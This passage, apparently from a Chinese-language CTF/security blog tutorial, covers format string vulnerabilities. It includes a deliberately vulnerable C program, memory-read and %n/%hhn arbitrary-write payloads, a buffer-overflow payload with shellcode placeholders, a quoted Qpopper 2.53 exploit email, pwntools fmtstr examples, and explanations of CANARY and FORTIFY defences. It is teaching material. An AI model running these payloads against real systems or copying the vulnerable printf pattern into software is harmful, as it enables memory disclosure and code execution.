src="http://148.70.228.11/gs12.png" alt=""><br>在输出的内存数据中，读到了缓冲区数据，读到了我们输入的AAAAAAAA。这里打印出来的”41414141”，是由第17个%08x打印出来的，那我们尝试把第17个%08x改为%s：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%s,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x</span><br></pre></td></tr></table></figure></p><p><img src="http://148.70.228.11/gs13.png" alt=""><br>运行后读到了非法地址返回内存非法访问错误。</p><p><strong>实验2：</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">char test[60] = &quot;It&apos;s a test for format string vulnerability&quot;;</span><br><span class="line">char key[10];</span><br><span class="line">void setKey();</span><br><span class="line"></span><br><span class="line">int main(int argc, char **argv)&#123;</span><br><span class="line">setKey();</span><br><span class="line">int a[8]=&#123;43690,43690,43690,43690,43690,43690,43690,43690&#125;;</span><br><span class="line">char* secretKey = key;</span><br><span class="line">/* </span><br><span class="line">    do things with secretkey balabala....</span><br><span class="line">*/</span><br><span class="line">char message[150];</span><br><span class="line">printf(&quot;Input:\n&quot;);</span><br><span class="line">scanf(&quot;%s&quot;, message);</span><br><span class="line">printf(&quot;Result:\n&quot;);</span><br><span class="line">printf(message);</span><br><span class="line">printf(&quot;\n&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void setKey()&#123;</span><br><span class="line">memcpy(key,&quot;ABCDEFGHI&quot;,10);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>程序中用全局变量key进行赋值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char* secretKey = key;</span><br></pre></td></tr></table></figure></p><p>经逆向分析可知此key在堆中的地址是：0x56557010，转为字符即是`pUV<br>算准%s的位置，写入payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AAAAAAAAAA`pUV%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x,%08x-%s-%08x,%08x,%08x,%08x,%08x</span><br></pre></td></tr></table></figure></p><p>可见成功读到了0x56557010地址的值：<br><img src="http://148.70.228.11/gs14.png" alt=""><br><strong>Note:</strong><br>由于ASLR, 按以上步骤可能无法用以上payload复现。</p><h2 id="2-4-覆盖任意位置的内存数据"><a href="#2-4-覆盖任意位置的内存数据" class="headerlink" title="2.4 覆盖任意位置的内存数据"></a>2.4 覆盖任意位置的内存数据</h2><h3 id="2-4-1-触发缓冲区溢出"><a href="#2-4-1-触发缓冲区溢出" class="headerlink" title="2.4.1 触发缓冲区溢出"></a>2.4.1 触发缓冲区溢出</h3><p>为了缓解缓冲区溢出或实现其他的功能，有时会有以下类似的程序:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">char outbuf[512];</span><br><span class="line">char buffer[512];</span><br><span class="line">sprintf (buffer, &quot;ERR Wrong command: %400s&quot;, user);</span><br><span class="line">sprintf (outbuf, buffer);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>• 第一个sprinf将设定的字符串”ERR…”语句和用户输入进行拼接后放入buffer。<br>• 第二个sprintf则将buffer的数据放入outbuffer中。</p><p>由于第一个sprintf有400字符的输入限制，一般情况下无法进行缓冲区溢出。但sprintf本身是格式化函数，攻击者可直接输入格式化字符串，利用格式化字符串漏洞来造成缓冲区溢出。<br>payload:   （小端）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%497d\x3c\xd3\xff\xbf&lt;nops&gt;&lt;shellcode&gt;</span><br></pre></td></tr></table></figure></p><p>%497会形成长度为497的字符串。再加上”ERR…”的19个字符，为516个字符，占栈516bytes。sprintf将这516个字节复制到outbuf。516bytes覆盖了output数组本身长度的512bytes和栈中保存的ebp 4bytes，再将随后的0xbfffd33c覆盖返回地址，形成了缓冲区溢出漏洞。</p><p>这个利用方法主要利用格式化函数和用户可输入格式化字符串，来触发目标函数的缓冲区溢出漏洞。在bftpd，Qpopper等多处都发现了相关的漏洞。如<a href="https://www.xuebuyuan.com/801539.html?mobile=1" target="_blank" rel="noopener">Qpopper 2.53版本的缓冲区溢出漏洞：https://www.xuebuyuan.com/801539.html?mobile=1</a></p><p>Qpopper是使用广泛的pop3服务器，允许用户通过pop3客户端来读取他们的邮件。在提供邮件信息时，pop_ uidl.c文件提取了收到邮件中的id、X-UIDL、from邮箱等信息，发给用户的pop3客户端。<br>pop_uidl.c：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">第150行处： </span><br><span class="line">sprintf(buffer, &quot;%d %s&quot;, msg_id, mp-&gt;uidl_str);</span><br><span class="line">if (nl = index(buffer, NEWLINE)) *nl = 0;</span><br><span class="line">sprintf(buffer, &quot;%s %d %.128s&quot;, buffer, mp-&gt;length, from_hdr(p, mp));</span><br><span class="line">return (pop_msg (p,POP_SUCCESS, buffer));</span><br></pre></td></tr></table></figure></p><p>pop_msg:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop_msg(POP *p,  int stat, const char *format,...)</span><br></pre></td></tr></table></figure></p><p>pop_msg函数中，会调用snprintf来输出邮件信息。snprintf的参数就是pop_msg的第三个参数format，包含了msg_id, X-UIDL,长度，from邮箱数据。</p><p><strong>利用案例</strong>：<br>攻击者发送邮件到受害者的邮箱，邮件信息为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">MAIL FROM:&lt;hakker@evil.org&gt;</span><br><span class="line">200 Ok</span><br><span class="line">RCPT TO:&lt;luser@host.withqpop253.com&gt;</span><br><span class="line">200 Ok</span><br><span class="line">data</span><br><span class="line">200 Okey, okey. end with &quot;.&quot;</span><br><span class="line">Subject: still trust qpop?=/</span><br><span class="line">X-UIDL: AAAAAAAAAAAAAAAA</span><br><span class="line">From: %p%p%p%p%p%p%p</span><br><span class="line"></span><br><span class="line">test</span><br></pre></td></tr></table></figure></p><p>受害者登上pop3客户端后，从Qpopper服务器中读取邮件信息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">+OK QPOP (version 2.53) at b0f starting. &lt;666.666@b0f&gt;</span><br><span class="line">USER luser</span><br><span class="line">+OK Password required for luser.</span><br><span class="line">PASS secret</span><br><span class="line">+OK luser has 3 messages (1644 octets).</span><br><span class="line">euidl 3</span><br><span class="line">+OK 2 AAAAAAAAAAAAAAAA 530 0xbfbfc9b00x804fd740xbfbfc9b00x2120x8052e5e0xbfbfd1e80x8057028</span><br></pre></td></tr></table></figure></p><p>得到的邮箱数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">2 AAAAAAAAAAAAAAAA 530 0xbfbfc9b00x804fd740xbfbfc9b00x2120x8052e5e0xbfbfd1e80x8057028</span><br><span class="line">msg_id, X-UIDL, 长度, from邮箱%p%p%p%p字符串导致的内存数据被输出</span><br></pre></td></tr></table></figure></p><p>虽然用了snprintf，但可通过2.4.2的方法，进行缓冲区溢出的数据覆盖。 </p><h3 id="2-4-2-利用"><a href="#2-4-2-利用" class="headerlink" title="2.4.2 利用%"></a>2.4.2 利用%</h3><p>之前所有的利用方法，都仅止步于“查看”数据上，因为payload里的%s, %x, %p等，都只能满足攻击者dump出内存数据的意图。既然之前说到，<font color="#FF4040">格式化字符串控制着格式化函数的行为</font>，那就代表着这个漏洞的利用不仅仅能单纯地查看数据。我们把目光移到一个特殊的格式化参数%n:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int i;</span><br><span class="line">printf(&quot;foobar%n\n&quot;, (int *) &amp;i);</span><br><span class="line">printf(&quot;i = %d\n&quot;,i);</span><br></pre></td></tr></table></figure></p><p>%n格式化参数的作用为，将已输出的字符数，写入提供的参数中。<br><img src="http://148.70.228.11/gs15.png" alt=""><br>从输出结果可见，变量i被赋值为6，为”foobar”的长度。由此，攻击者就掌握了一个可以写入数据的方法 – %n。<br>结合2.3处查看任何位置内存数据的方法，只要格式参数的数量恰当，就能让某一个格式参数正好对上格式化字符串头部的地址，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\xc0\xc8\xff\xbf_%08x.%08x.%08x.%08x.%08x.%n</span><br></pre></td></tr></table></figure></p><p>若%n成功对上了开头的0xbfffc8c0，就能在0xbfffc8c0地址处，写入已输出的字符数。</p><p>既然我们控制着格式化字符串，要修改输出的字符数，也非常简单。通过参数%nu（n位长的数字），我们可以增加输出的字符数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char **argv)&#123;</span><br><span class="line">     int a;</span><br><span class="line">     printf(&quot;%10u%n&quot;, 7350, &amp;a);</span><br><span class="line">    printf(&quot;\n a=%d&quot;,a);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>输出：<br><img src="http://148.70.228.11/gs16.png" alt=""><br>此处7350用10位长的数字格式输出，不足的位用空位补全。可见变量a的值就为10。那么靠%nu或者%nd等格式参数，就可以把字符数增加到我们想要的值。</p><p>但是如果要写入的数据过大，特别是地址值，仅靠以上的方法就不够了。如果我们要在某一个地址写入0xFFFFFFFF，我们不可能要写入4294967295个字符，那么要利用%n写入数据就要另辟门道。这里可用到%hn/%hhn。%hn是向目标地址写入两个字节的数据，%hhn则写入一个字节的数据。<br>假如:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们要在地址：  0x55556666</span><br><span class="line">写入数据：      0x12345678</span><br></pre></td></tr></table></figure></p><p>那么方法是：（小端）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1. 120字符数 %hhn – 地址55556666 – 写入了0x78</span><br><span class="line">2. 342字符数 %hhn – 地址55556667 – 写入了0x56 (342是0x156,由于只写入1个字节，丢弃了高位1)</span><br><span class="line">3. 564字节数 %hhn – 地址55556668 – 写入了0x34 (564 – 0x234,丢弃高位)</span><br><span class="line">4. 786字节数 %hhn – 地址55556669 – 写入了0x12(786 – 0x312,丢弃高位)</span><br></pre></td></tr></table></figure></p><p>若栈上buffer的距离为6：<br><img src="http://148.70.228.11/gs38.png" alt=""><br>要塞进垃圾字节，是因为用到%nu来凑字符数时，需要消耗内存位。垃圾字节可为任意值。</p><p>用%hn/%hhn来进行写入数据并不是万用的，在某些老版本的GNU C库（如libc5）并不支持%hn/%hnn。论文”Exploiting Format String Vulnerabilities”里，提出了类似的方法。不用%hnn，可使用地址多次写入覆盖。<br><img src="http://148.70.228.11/gs17.png" alt=""><br>这个方法会覆盖掉高位的3bytes数据。</p><h1 id="3-漏洞相关"><a href="#3-漏洞相关" class="headerlink" title="3. 漏洞相关"></a>3. 漏洞相关</h1><h2 id="3-1-pwntools"><a href="#3-1-pwntools" class="headerlink" title="3.1 pwntools"></a>3.1 pwntools</h2><blockquote><p><a href="http://pwntools.readthedocs.io/en/stable/fmtstr.html" target="_blank" rel="noopener">http://pwntools.readthedocs.io/en/stable/fmtstr.html</a></p></blockquote><p>pwntools是一组Python库，经常用于CTF PWN中。可用于建立起进程，与进程交互，以及为一些漏洞利用提供帮助。<br>和格式化字符串相关的主要为pwnlib.fmtstr，其中有一个主要的类:</p><h3 id="3-1-1-FmtStr"><a href="#3-1-1-FmtStr" class="headerlink" title="3.1.1 FmtStr:"></a>3.1.1 FmtStr:</h3><p>FmtStr类是一个自动化的格式化字符串漏洞利用的类。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">class pwnlib.fmtstr.FmtStr(execute_fmt, offset=None, padlen=0, numbwritten=0):</span><br><span class="line">execute_fmt (function) – function to call for communicate with the vulnerable process</span><br><span class="line">offset (int) – the first formatter’s offset you control  # 到buffer的栈中偏移量，参考2.3</span><br><span class="line">padlen (int) – size of the pad you want to add before the payload  </span><br><span class="line">numbwritten (int) – number of already written bytes   # 已经写入了的字节数</span><br></pre></td></tr></table></figure></p><p>这样能简单生成这个类：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># Assume a process that reads a string</span><br><span class="line"># and gives this string as the first argument</span><br><span class="line"># of a printf() call</span><br><span class="line"># It do this indefinitely</span><br><span class="line">p = process(&apos;./vulnerable&apos;)</span><br><span class="line"></span><br><span class="line"># Function called in order to send a payload</span><br><span class="line">def send_payload(payload):</span><br><span class="line">        print(&quot;payload = %s&quot; % repr(payload))</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        return p.recv()</span><br><span class="line"></span><br><span class="line"># Create a FmtStr object and give to him the function</span><br><span class="line">format_string = FmtStr(execute_fmt=send_payload)</span><br></pre></td></tr></table></figure></p><p>这个类有两个方法，用于写入数据：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execute_writes() ： 生成payload发给目标程序</span><br><span class="line">write(addr, data) : 生成命令“利用漏洞在地址addr写入data数据”</span><br></pre></td></tr></table></figure></p><p>利用例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">def send_fmt_payload(payload):</span><br><span class="line">     print repr(payload)</span><br><span class="line"></span><br><span class="line">f = FmtStr(send_fmt_payload, offset=5)</span><br><span class="line">f.write(0x08040506, 0x1337babe)   # 在0x08040506处写入0x1337babe</span><br><span class="line">f.execute_writes()                # 根据上一行，生成payload并发送</span><br><span class="line">&apos;\x06\x05\x04\x08\x07\x05\x04\x08\x08\x05\x04\x08\t\x05\x04\x08%174c%5$hhn%252c%6$hhn%125c%7$hhn%220c%8$hhn&apos;</span><br></pre></td></tr></table></figure></p><p>FmtStr.offset则会自动算好offset:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line">offset = autofmt.offset</span><br></pre></td></tr></table></figure></p><h3 id="3-1-2-fmtstr-payload："><a href="#3-1-2-fmtstr-payload：" class="headerlink" title="3.1.2 fmtstr_payload："></a>3.1.2 fmtstr_payload：</h3><p>fmtstr_payload也是一个经常用到的函数，能根据提供的参数，生成任意地址写入数据的payload。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwnlib.fmtstr.fmtstr_payload(offset, writes, numbwritten=0, write_size=&apos;byte&apos;) → str</span><br><span class="line">offset (int) – the first formatter’s offset you control                   # 到buffer的栈中偏移量，参考2.3</span><br><span class="line">writes (dict) – dict with addr, value &#123;addr: value, addr2: value2&#125;     # 想要写入的&#123;地址：数值&#125;字典</span><br><span class="line">numbwritten (int) – number of byte already written by the printf function  # 已经写入了的字节数</span><br><span class="line">write_size (str) – must be byte, short or int. Tells if you want to write byte by byte, short by short or int by int (hhn, hn or n)                              # 写入数据的单位（按byte大小一字节一字节地写入，还是按short/int）</span><br></pre></td></tr></table></figure></p><p>例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">context.clear(arch = &apos;amd64&apos;)</span><br><span class="line">print repr(fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&apos;int&apos;))</span><br><span class="line">&apos;\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00%322419374c%1$n%3972547906c%2$n&apos;</span><br><span class="line"></span><br><span class="line">print repr(fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&apos;short&apos;))</span><br><span class="line">&apos;\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00%47774c%1$hn%22649c%2$hn%60617c%3$hn%4$hn&apos;</span><br><span class="line"></span><br><span class="line">print repr(fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&apos;byte&apos;))</span><br><span class="line">&apos;\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x00%126c%1$hhn%252c%2$hhn%125c%3$hhn%220c%4$hhn%237c%5$hhn%6$hhn%7$hhn%8$hhn&apos;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; context.clear(arch = &apos;i386&apos;)</span><br><span class="line">&gt;&gt;&gt; print repr(fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&apos;int&apos;))</span><br><span class="line">&apos;\x00\x00\x00\x00%322419386c%1$n&apos;</span><br><span class="line"></span><br><span class="line">&gt;&gt;&gt; print repr(fmtstr_payload(1, &#123;0x0: 0x1337babe&#125;, write_size=&apos;short&apos;))</span><br><span class="line">&apos;\x00\x00\x00\x00\x02\x00\x00\x00%47798c%1$hn%22649c%2$hn&apos;</span><br></pre></td></tr></table></figure></p><p>配合fmtstr可以直接自动化利用格式化字符串漏洞：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p = process(&apos;./vulnerable&apos;)</span><br><span class="line">def exec_fmt(payload):</span><br><span class="line">   p.sendline(payload)</span><br><span class="line">   return p.recvall()</span><br><span class="line"></span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line">offset = autofmt.offset</span><br><span class="line">addr = 0x11111111</span><br><span class="line">payload = fmtstr_payload(offset, &#123;addr: 0x1337babe&#125;)</span><br><span class="line">p.sendline(payload)</span><br></pre></td></tr></table></figure></p><h2 id="3-2-准备工具"><a href="#3-2-准备工具" class="headerlink" title="3.2 准备工具"></a>3.2 准备工具</h2><h3 id="3-2-1-checksec"><a href="#3-2-1-checksec" class="headerlink" title="3.2.1 checksec"></a>3.2.1 checksec</h3><p>checksec用于查看可执行文件的一些属性，如PIE，RELRO，Canaries，Fortify Source等。<br><img src="http://148.70.228.11/gs18.png" alt=""><br>这里使用了gdb的peda插件的checksec功能。github上checksec单独脚本：</p><blockquote><p><a href="https://github.com/slimm609/checksec.sh" target="_blank" rel="noopener">https://github.com/slimm609/checksec.sh</a></p></blockquote><h3 id="3-2-2-静态链接"><a href="#3-2-2-静态链接" class="headerlink" title="3.2.2 静态链接"></a>3.2.2 静态链接</h3><p>静态连接库就是把(lib)文件中用到的函数代码直接链接进目标程序，程序运行的时候不再需要其它的库文件。动态链接就是把调用的函数所在文件模块和调用函数在文件中的位置等信息链接进目标程序，程序运行的时候再从库中寻找相应函数代码。静态链接库与动态链接库都是共享代码的方式，如果采用静态链接库，则无论你愿不愿意，lib 中的指令都全部被直接包含在最终生成的可执行文件中<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ldd elf</span><br><span class="line">  not a dynamic executable</span><br></pre></td></tr></table></figure></p><p>在利用格式化字符串漏洞前，要检测ELF是否为静态链接，以上提醒则表示为静态链接。静态链接的ELF文件由于不需要和so文件的函数入口建立mapping，无法覆盖GOT表来进行利用。</p><h3 id="3-3-3-Libcdb-com"><a href="#3-3-3-Libcdb-com" class="headerlink" title="3.3.3 Libcdb.com"></a>3.3.3 Libcdb.com</h3><p>在覆盖GOT时，我们可以通过一个函数的地址，靠两个函数地址间的偏移量，来推算出另一个函数的地址。但是，Linux内核是不断在更新的，其中libc的版本也在不断地更新，函数之间的相对偏移也可能发生变化。若不知道libc的版本，也就无法确定函数间的偏移量。</p><p>解决方法是，若我们拥有从Linux发行以来所有版本的 libc 文件，且通过格式化字符串漏洞打出至少两个函数在目标主机中的真实地址，就可以根据两个已知函数的地址的偏移来推算出libc的版本。</p><blockquote><p><a href="http://libcdb.com/" target="_blank" rel="noopener">http://libcdb.com/</a> </p></blockquote><p>就是用于实现这个目的的网站。Pwntools 中的 DynELF 就是根据这个原理运作的。通过这个网站，我们就可以得到libc.so的版本。</p><h2 id="3-3-ELF的安全机制"><a href="#3-3-ELF的安全机制" class="headerlink" title="3.3 ELF的安全机制"></a>3.3 ELF的安全机制</h2><p>在对一个ELF使用checksec时，就是要检查一个ELF采取的安全机制。<br><img src="http://148.70.228.11/gs19.png" alt=""><br>checksec中检查了5项：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CANARY, FORTIFY, NX, PIE, RELRO</span><br></pre></td></tr></table></figure></p><p>以下做了简单的介绍，以及对格式化字符串漏洞利用的影响。</p><h3 id="3-3-1-CANARY"><a href="#3-3-1-CANARY" class="headerlink" title="3.3.1 CANARY"></a>3.3.1 CANARY</h3><blockquote><p>参考：<a href="https://access.redhat.com/blogs/766093/posts/3548631" target="_blank" rel="noopener">https://access.redhat.com/blogs/766093/posts/3548631</a></p></blockquote><p>CANARY是为了解决缓冲区溢出提出的一种防御机制。缓冲区溢出漏洞的基本利用为覆盖返回地址，但覆盖的过程是连续的，会同时覆盖返回地址前的一连串数据。CANARY机制就是同于检测出这样的现象。<br><img src="http://148.70.228.11/gs20.png" alt=""><br>Stack Canary机制，或是StackGuard，在每一个函数的栈中Frame Pointer(ebp)上，加入了一个Canary字段的数据。这个字段可能是固定的、随机值或随机值^返回地址，具体取决于Canary的实现。图右显示的Stack Canary出现在EBP和return address之间，具体情况有待考究。</p><p>在缓冲区溢出覆盖返回地址的过程中，会先后覆盖Canary，FP，返回地址。函数返回时，程序检测到Canary值被修改了，就会报错。Canary机制并不能根治缓冲区溢出漏洞，只能增加漏洞的利用成本，攻击者还是可以有方法绕过Canary的检测。</p><p>对于格式化字符串的漏洞，Canary机制的开启与否并不会产生任何的影响。<br>（在缓冲区溢出里补充吧）</p><h3 id="3-3-2-FORTIFY"><a href="#3-3-2-FORTIFY" class="headerlink" title="3.3.2 FORTIFY"></a>3.3.2 FORTIFY</h3><blockquote><p>参考：<a href="https://access.redhat.com/blogs/766093/posts/3606481" target="_blank" rel="noopener">https://access.redhat.com/blogs/766093/posts/3606481</a></p></blockquote><p>Fortify提供了编译时和运行时对部分内存空间和字符串函数的保护，主要是为了防护缓冲区溢出和格式化字符串漏洞。在GCC中，Fortify将部分字符串函数和内存操控函数，替换为对应的*_chk函数，经过一些计算来防止溢出。如果检测到溢出，则终止程序。</p><p>若有大小为5的字符数组：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">char buf[5];</span><br></pre></td></tr></table></figure></p><p>对于以下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">memcpy (buf, foo, 5);</span><br><span class="line">strcpy (buf, &quot;abcd&quot;);</span><br></pre></td></tr></table></figure></p><p>复制进buf的字符串大小是已知的，这时Fortify知道不会产生任何缓冲区溢出的问题，所以直接调用memcpy/strcpy。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">memcpy (buf, foo, 6);</span><br><span class="line">strcpy (buf, &quot;abcde&quot;);</span><br></pre></td></tr></table></figure></p><p>复制进buf的字符串大小已知，但明显超出了buf的大小，所以fortify在编译时就检测到了缓冲区溢出问题，产生warnings，并在runtime调用额外的检查。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">memcpy (buf, foo, n);</span><br><span class="line">strcpy (buf, bar);</span><br></pre></td></tr></table></figure></p><p>编译器无法知道n的大小，这时Fortify会将memcpy和strcpy替换为_memcpy_chk和_strcpy_chk，在runtime检测缓冲区溢出。如果检测到缓冲区溢出，会调用__chk_fail()终止程序。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">memcpy (p, q, n);</span><br><span class="line">strcpy (p, q);</span><br></pre></td></tr></table></figure></p><p>对于buf大小和复制字符的大小都无法得知的情况，Fortify无法进行保护。</p><p>Fortify对以下字符串和内存操作函数做了安全保护：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Memcpy, memset, stpcpy, strcpy, strncpy, strcat, strncat, sprintf, snprintf, vsprintf, vsnprintf, gets()</span><br></pre></td></tr></table></figure></p><p>开启Fortify要在编译程序时，设置-D_FORTIFY_SOURCE宏。Fortify设置有两个等级，-D_FORTIFY_SOURCE=2会包含更深入的函数检查。编译时设置-D_FORTIFY_SOURCE=1 和设置-D_FORTIFY_SOURCE=2的区别是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">struct S &#123; </span><br><span class="line">    struct T &#123;</span><br><span class="line">         char buf[5];</span><br><span class="line">          int x; </span><br><span class="line">          &#125; t;</span><br><span class="line">     char buf[20]; </span><br><span class="line">&#125; var;</span><br></pre></td></tr></table></figure></p><p>对于这样的结构体，strcpy (&amp;var.t.buf[1], “abcdefg”) 只会在等级为2时，检测到缓冲区溢出。</p><p>同时，-D_FORTIFY_SOURCE=2包含了格式化字符串中%n的检测。当设置了Fortify等级为2时，包含%n的格式化字符串只允许处在只读的内存空间。在利用格式化字符串漏洞时，攻击者需要使用%n来写数据进内存，此时Fortify就可以检测出格式化字符串漏洞。（当且仅当-D_FORTIFY_SOURCE为2）</p><h3 id="3-3-3-NX"><a href="#3-3-3-NX" class="headerlink" title="3.3.3 NX"></a>3.3.3 NX</h3><p>NX的提出的初衷是为了解决缓冲区溢出。通过CPU硬件支持，在分页设置中对内存页的NX bit进行设置。为了解决缓冲区溢出中，攻击者可将shellcode写在栈上，直接覆盖return 